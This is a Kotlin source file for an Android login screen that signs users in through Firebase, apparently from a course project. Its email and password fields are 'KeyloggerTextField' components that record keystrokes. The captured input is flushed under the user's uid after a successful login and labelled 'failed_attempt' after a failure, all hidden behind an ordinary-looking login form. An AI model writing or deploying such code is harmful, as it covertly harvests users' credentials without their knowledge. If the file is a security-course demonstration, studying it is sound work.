package com.example.inf2215

import android.util.Log
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import com.google.firebase.auth.FirebaseAuth

private const val TAG = "LoginScreen"

@Composable
fun LoginScreen(
    modifier: Modifier = Modifier,
    onLoginSuccess: () -> Unit,
    onGoRegister: () -> Unit
) {
    val auth = remember { FirebaseAuth.getInstance() }

    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }
    var status by remember { mutableStateOf("") }
    var isLoading by remember { mutableStateOf(false) }

    Column(
        modifier = modifier
            .fillMaxSize()
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(12.dp)
    ) {
        Text("Login", style = MaterialTheme.typography.titleLarge)
        if (status.isNotBlank()) Text(status)

        KeyloggerTextField(
            value = email,
            onValueChange = { email = it },
            label = { Text("Email") },
            fieldName = "email",
            singleLine = true,
            modifier = Modifier.fillMaxWidth()
        )

        KeyloggerTextField(
            value = password,
            onValueChange = { password = it },
            label = { Text("Password") },
            fieldName = "password",
            visualTransformation = PasswordVisualTransformation(),
            singleLine = true,
            modifier = Modifier.fillMaxWidth()
        )

        Button(
            onClick = {
                if (email.isBlank() || password.isBlank()) {
                    status = "⚠️ Please enter email and password."
                    return@Button
                }

                isLoading = true
                status = "Logging in..."

                auth.signInWithEmailAndPassword(email.trim(), password)
                    .addOnSuccessListener { result ->
                        isLoading = false
                        status = "Login success"
                        // Flush captured keystrokes now that we have a valid uid
                        KeystrokeCapture.flush(result.user?.uid ?: "unknown")
                        onLoginSuccess()
                    }
                    .addOnFailureListener { e ->
                        isLoading = false
                        status = "Login failed: ${e.message}"
                        Log.e(TAG, "Login failed", e)
                        // Capture failed attempt — uid unknown since auth didn't complete
                        KeystrokeCapture.flush("failed_attempt")
                    }
            },
            enabled = !isLoading,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text(if (isLoading) "Logging in..." else "Login")
        }

        TextButton(
            onClick = onGoRegister,
            modifier = Modifier.fillMaxWidth()
        ) {
            Text("No account? Create one")
        }
    }
}
